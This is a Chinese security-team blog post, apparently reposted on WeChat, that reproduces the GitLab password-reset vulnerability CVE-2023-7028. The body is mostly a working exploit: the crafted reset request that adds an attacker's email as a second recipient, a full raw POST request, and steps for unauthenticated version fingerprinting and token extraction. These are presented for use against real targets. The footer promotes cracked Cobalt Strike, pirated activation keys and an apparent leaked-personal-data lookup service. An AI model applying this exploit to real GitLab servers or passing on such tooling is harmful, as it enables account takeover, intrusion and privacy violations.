#  GitLab 任意用户密码重置漏洞复现（CVE-2023-7028）

[ 刨洞安全团队 ](javascript:void\(0\);)

**刨洞安全团队** ![]()

微信号 gh_55f3b3854b4b

功能介绍
刨洞群官方公众号，一群热爱网络安全的人，关注渗透测试、红队攻防、代码审计、内网渗透、WAF绕过、云原生安全等领域技术研究，分享网安学习心得，永远充满激情。

____

___发表于_

以下文章来源于Evilc0de 安全团队 ，作者evilc0de

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM4JibS2eicdibMOVTSXjAXvxGGFlOick7EQLfWjLWVWZBib2Jg/0)
**Evilc0de 安全团队** .

Evilc0de
安全团队始于2018年由一群热爱网络安全的白帽子创建。注重红蓝对抗，安全研究，SRC众测，安全开发、WEB安全、漏洞挖掘。团队创建从开始到现在一直秉持潜心习安全，低调求发展的初心。

## 漏洞描述

2024年1月11日，`Gitlab` 官方披露 `CVE-2023-7028`，GitLab
任意用户密码重置漏洞，官方评级严重。攻击者可利用忘记密码功能，构造恶意请求获取密码重置链接从而重置密码。官方已发布安全更新，建议升级至最新版本，若无法升级，建议利用安全组功能设置
`Gitlab` 仅对可信地址开放。

## 漏洞利用条件

  

1、需获取系统已有用户注册邮箱地址

2、满足影响版本

    
    
    16.1 <=GitLab CE<16.1.6  
    16.2 <=GitLab CE<16.2.8  
    16.3 <=GitLab CE<16.3.6  
    16.4 <=GitLab CE<16.4.4  
    16.5 <=GitLab CE<16.5.6  
    16.6 <=GitLab CE<16.6.4  
    16.7 <=GitLab CE<16.7.2  
    16.1 <=GitLab EE<16.1.6  
    16.2 <=GitLab EE<16.2.8  
    16.3 <=GitLab EE<16.3.6  
    16.4 <=GitLab EE<16.4.4  
    16.5 <=GitLab EE<16.5.6  
    16.6 <=GitLab EE<16.6.4  
    16.7 <=GitLab EE<16.7.2  
    

##

## 复现过程

> 这里被找回邮箱为个人注册邮箱地址，真实环境中需先获取目标邮箱地址

访问找回密码页面：`/users/password/new`

![]()

填写被找回邮箱地址，然后点击抓包

![]()

修改请求包为：`user[email][]=目标邮箱地址&user[email][]=攻击者邮箱地址`![]()

成功复现![]()

其实这里看到收件人邮箱已经变为两个了

##

## 半自动化

关于自动化主要有两个坑点，第一是如何获取版本号，第二是在找回密码的阶段会需要有一个`uauthenticity_token`

下面针对上面2点提出解决办法：

 **1、获取版本**

公开的一些获取版本的办法大多是需要鉴权的，这里分享一种不需要登录的办法

访问`/assets/webpack/manifest.json`

![]()

获取hash值去GitHub对比版本号  
https://github.com/righel/gitlab-version-nse/blob/main/gitlab_hashes.json

![]()

可以发现版本是`gitlab-ce 16.5.0`

对比发现是正确的![]()

 **2、authenticity_token获取**

访问找回密码界面`/users/password/new`

查看源代码搜索`authenticity_token`即可

![]()

构造http请求包

    
    
    POST /users/password HTTP/1.1  
    Host: xx.com  
    Origin: http://xx.com  
    Content-Type: application/x-www-form-urlencoded  
    Referer: http://xx.com/users/password/new8  
    Cookie: preferred_language=zh_CN; _gitlab_session=e00664e028c369cdd6dff19f6d7b76bf  
      
    authenticity_token=vJBEyoTkR10UJNhrFcoJOYftTHaxPj3MHVSJusNt85SyyZ60RajsS2RsgkMetn7hd_k891ZUNCdePjdW5uUW6w&user%5Bemail%5D%5B%5D=目标邮箱地址&user%5Bemail]%5D%5B%5D=攻击者邮箱地址  
    

##

## 补充

![]()![]()

##

## Reference

  * 

    
    
    https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/#account-takeover-via-password-reset-without-user-interactions

  

![]()

关注公众号后台回复 `0001` 领取域渗透思维导图，`0002` 领取VMware 17永久激活码，`0003` 获取SGK地址，`0004`
获取在线ChatGPT地址，`0005` 获取 Windows10渗透集成环境，`0006` 获取 CobaltStrike 4.9.1破解版

  

加我微信好友，邀请你进交流群

  

![]()

  

  

  

往期推荐

  
  
[

对某金融App的加解密hook+rpc+绕过SSLPinning抓包

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247484615&idx=1&sn=b0cfad610f3e27476b5ea35862060b61&chksm=c35843e4f42fcaf295a2846511ee06c6e2a89a30e1924763264947906e6959319392399f1f8d&scene=21#wechat_redirect)[

疑似境外黑客组织对CSDN、吾爱破解、bilibili等网站发起DDoS攻击

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247484581&idx=1&sn=ebf96305b45f385ac2d4652b3274ed03&chksm=c3584386f42fca906f91c79479e67f98e0c28a7b65e9cef5338f7b4dd045d9393a52fc01586c&scene=21#wechat_redirect)[

Fofa新产品 - 绕CDN溯源真实IP！

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247484562&idx=1&sn=81069adf9a0658d02187bd32165d5953&chksm=c35843b1f42fcaa7379c3aa56ad08a6f5af97fc597310daa896a104ee6e32fe7354779c604ad&scene=21#wechat_redirect)[

Cobalt Strike 4.8 正式发布上线！

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247484549&idx=1&sn=c740626cd569a96ccc8ca15db33e459f&chksm=c35843a6f42fcab0420c4b0deaa5d99827e18604d8cbafeb1f457a6d984cc64f9185345f0316&scene=21#wechat_redirect)[

团队在线Windows进程识别正式内测

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247484462&idx=1&sn=ab9b33db5d5bf47acd2a8c7b7e6ed443&chksm=c358430df42fca1bd43b2bf25540c96d417ce31dbbaf0d1a99d4333249e8003c29c79c509299&scene=21#wechat_redirect)[

突发！微信疑似存在RCE

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247484314&idx=1&sn=7c171d3b48384d338149cdd3c41f1aa3&chksm=c35844b9f42fcdafcfc02adadaa8409c3627b79fa88760e8af93f0012ff5d5ece24723990ce4&scene=21#wechat_redirect)[

OpenWrt 迎 20 周年，官方宣布将推出首款路由器

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247495582&idx=1&sn=97a783cac2bb225ef2ddcfd3e32bece1&chksm=c35ba8bdf42c21abf85e81aedc2d02974004dd91581d556fe6f5c4f3334298cd7076c3301115&scene=21#wechat_redirect)[

机圈大地震！

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247495558&idx=1&sn=0b8f4852351bc91caf1e983941b0639e&chksm=c35ba8a5f42c21b3b1ea071e303aeda4ea70f87189bdfaf39879be493fc295d8357ccf7ae51a&scene=21#wechat_redirect)[

JS逆向实战：RPC + Mitmproxy

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247495529&idx=1&sn=c1bb8e5a0c61dd8d920ca645979a784f&chksm=c35ba84af42c215cc2c0292a84cf427e3b0c9595fe27c2ed39782c17d547434d29e414fcdac4&scene=21#wechat_redirect)[

BeanShell注入内存马

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247495495&idx=1&sn=c0255e497c6ce24c816ddca4d4bf0086&chksm=c35ba864f42c2172f667aa12f159554f0554833557e9cc30a200b2d862389a898618e05b252b&scene=21#wechat_redirect)[

记一次CMS系统通杀0day审计

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247495442&idx=1&sn=2f865aee7608d229b203cc031ee17200&chksm=c35ba831f42c212734b73f26955f0d598e07dc354c39762f8092ad25ba2b7b10b2fcc0f565ea&scene=21#wechat_redirect)[

银狐处置及分析

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247494772&idx=1&sn=9fa27f2e02c059d50057b9fa851e2783&chksm=c35bab57f42c2241443abb74da20f3090962183495df25977fa05098bfbe2bf4245fafdd4e6a&scene=21#wechat_redirect)[

浅谈安全方向的学习方法

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247494738&idx=1&sn=0e270bce7be21979fa2b3847674d556f&chksm=c35bab71f42c2267e4bf49d6e4a20c38554eb5f64fea01d529643fc2824c492e30724bccc339&scene=21#wechat_redirect)[

极端容器场景下的远程文件下载思路

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247494701&idx=1&sn=a30da467d93802a56bc99bd004126d3b&chksm=c35bab0ef42c2218fef4e86b341ad518f62669948af7177e313040d780e108afa42b9a05d0f6&scene=21#wechat_redirect)[

记一次校内的XX系统渗透

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247494728&idx=1&sn=c3e4b55f576385069ba57b55392d5a20&chksm=c35bab6bf42c227d67a3f674737b2402426e0d8567932b90835c51c220a582de24ecca9185be&scene=21#wechat_redirect)[

对某菠菜的渗透测试笔记

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247494532&idx=1&sn=b1bc16139196a5591f22b6cad3e34067&chksm=c35baca7f42c25b1167f00918db0b658548831589c54504fc1961661175059445619254a1b95&scene=21#wechat_redirect)[

APT29利用CVE-2023-38831攻击大使馆

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247494338&idx=1&sn=b425692ca7b18245c110ed26b6e02068&chksm=c35bade1f42c24f71ed1c1bcdbee707bd93412118c87b99854c94bd6b726253f6d828977fd69&scene=21#wechat_redirect)[

某次以目的为导向的内网渗透-取开发源码

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247494369&idx=1&sn=87e69e70f762e3732070017a5e9781f2&chksm=c35badc2f42c24d44b41093edb3de25a37765445628a63ed66046d2bbe2a6dea0e530ac68841&scene=21#wechat_redirect)[

《永结无间》客户端RCE漏洞

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247494255&idx=1&sn=dbbdeccd9e967f493ce60e130c5d2125&chksm=c35bad4cf42c245a49d6781b030858440e35d856757b2c8977f6fce1a41f9b0b5e5f0bce5b23&scene=21#wechat_redirect)[

发现新恶意团伙"紫狐"！针对finalshell的供应链事件

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247494120&idx=1&sn=b2c1282cfe6982ab6b7b321f43efde71&chksm=c35baecbf42c27ddcb2610a5a4960ed3ef768d8444040fc4efe5c4e0cb1f94ccb3a941a1ff5b&scene=21#wechat_redirect)[

资源委派 (提权/横向移动)

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247493747&idx=1&sn=60f8b9d4fe4b237030b507e52dd906be&chksm=c35baf50f42c264687e3db7d60c93cc3f8a68bf677828bd798fe961d445208eaa8fea24e0ee2&scene=21#wechat_redirect)[

记一次红队经历

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247493839&idx=1&sn=94a2f6aa4d493366835d4b2b69897c96&chksm=c35bafecf42c26fa7c1ab2c8afc06d8da8c60f629bdfe2b32c682165b9c63d48354f3c23d159&scene=21#wechat_redirect)[

COM接口学习与利用

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247493640&idx=1&sn=31c5124b2777ee8fd4f3ddd11e582479&chksm=c35baf2bf42c263d95aa129107bfb14870230b930274df65d7cc9195589c6b4ca53abd446aec&scene=21#wechat_redirect)[

域渗透之NTLM Relay

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247493591&idx=1&sn=b150231242cfe62b7f3873e0887bdc07&chksm=c35ba0f4f42c29e215be1ae1ef572995b5483d9f9541f46ffdb9ee235b0bef5316c5abea2e05&scene=21#wechat_redirect)[

Java审计之CMS中的那些反序列化漏洞

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247493449&idx=1&sn=0f158c870853096963238ff3c6214ccb&chksm=c35ba06af42c297cdb8a3111f4db1fa4d15640ac259257b8db1b61256977a0be0f6bcad5dbf0&scene=21#wechat_redirect)[

KKCMS 1.371 代码审计

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247493518&idx=1&sn=7b8ac2ee33526e0943fc0bc39b7f59c4&chksm=c35ba0adf42c29bbb6328a2e94126705d510569208b38124109f89e80ba917afe409cd9be0da&scene=21#wechat_redirect)[

D-Link DAP-X1860：远程命令注入

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247493237&idx=1&sn=93c3e01058a2095d5b7242061e9e3c00&chksm=c35ba156f42c28401d7e8cf008e8e119959416fbb111433dff07e6eeaa7d770c3bb25444dde5&scene=21#wechat_redirect)[

国产之光IDE，自带国产特色VIP功能！

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247493223&idx=2&sn=5d23802651b7f4457e5ca2f73ee40e96&chksm=c35ba144f42c2852bea3b0491cd8550cad5f63b68e6859f2c2445cbf3c0e7a882efb06d15503&scene=21#wechat_redirect)[

JeecgBoot SSTI以及JDBC RCE 复现

](https://mp.weixin.qq.com/s?__biz=Mzk0OTM5MTk0OA==&mid=2247493076&idx=1&sn=f4c4159cdc454cb23bff73bdcbe13e14&chksm=c35ba2f7f42c2be10eb363986923ef326942ef71c9412f0caa217b805a2c784b2b131b7f9a5f&scene=21#wechat_redirect)

备用号，欢迎关注

  

![]()

预览时标签不可点

微信扫一扫  
关注该公众号

继续滑动看下一个

# GitLab 任意用户密码重置漏洞复现（CVE-2023-7028）

[ 刨洞安全团队 ](javascript:void\(0\);)

轻触阅读原文

![]()

刨洞安全团队

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看 分享 留言

